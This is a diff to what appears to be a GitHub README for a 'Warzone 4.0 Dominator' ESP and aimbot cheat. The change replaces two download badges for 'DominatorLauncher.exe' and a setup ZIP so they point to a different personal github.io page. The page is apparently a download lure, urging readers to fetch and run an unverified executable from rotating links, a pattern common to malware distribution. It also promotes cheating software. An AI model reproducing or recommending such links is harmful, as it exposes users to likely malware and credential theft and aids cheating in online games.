@@ -1,7 +1,7 @@
 # 🎯 Warzone 4.0 Dominator — ESP - Aimbot 
 
-[![Download DominatorLauncher.exe](https://img.shields.io/badge/Download-DominatorLauncher.exe-green?style=for-the-badge)](https://warzone-4-0-dominator-esp-aimbot.github.io/.github/)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://warzone-4-0-dominator-esp-aimbot.github.io/.github/)
+[![Download DominatorLauncher.exe](https://img.shields.io/badge/Download-DominatorLauncher.exe-green?style=for-the-badge)](https://ingrampoppy75.github.io/.github/warzone-4-0-dominator-esp-aimbot)
+[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://ingrampoppy75.github.io/.github/warzone-4-0-dominator-esp-aimbot)
 
 ---
 
